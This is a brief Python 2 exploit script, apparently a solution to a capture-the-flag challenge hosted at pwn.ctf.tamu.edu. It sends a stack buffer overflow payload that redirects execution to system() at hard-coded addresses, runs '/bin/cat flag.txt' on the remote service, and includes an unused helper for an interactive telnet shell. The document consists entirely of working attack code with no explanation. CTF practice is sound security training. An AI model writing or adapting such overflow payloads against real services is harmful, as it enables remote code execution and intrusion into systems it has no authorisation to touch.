import socket
import struct
import time
import telnetlib

def s(s):return sock.send(s)
def p(a):return struct.pack("<I",a)
def u(a):return struct.unpack("<I",a)[0]

def r(s):
	if type(s)==str:
		data=""
		while not data.endswith(s):
			data+=sock.recv(1)
		return data
	else:
		data=sock.recv(s)
		return data

def shell(sock):
	t=telnetlib.Telnet()
	t.sock=sock
	t.interact()
	sock.close()


HOST="pwn.ctf.tamu.edu"
PORT=4324

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

BUF = ""
BUF += "A"*0x10
BUF += p(0x08048390) # SYSTEM_ADDR
BUF += p(0x12345678) # return addr
BUF += p(0x0804a028) # ARG1(/bin/cat flag.txt)
BUF += p(0x00000000) # ARG2(0)
BUF += "\n"

s(BUF)
print r(1024)
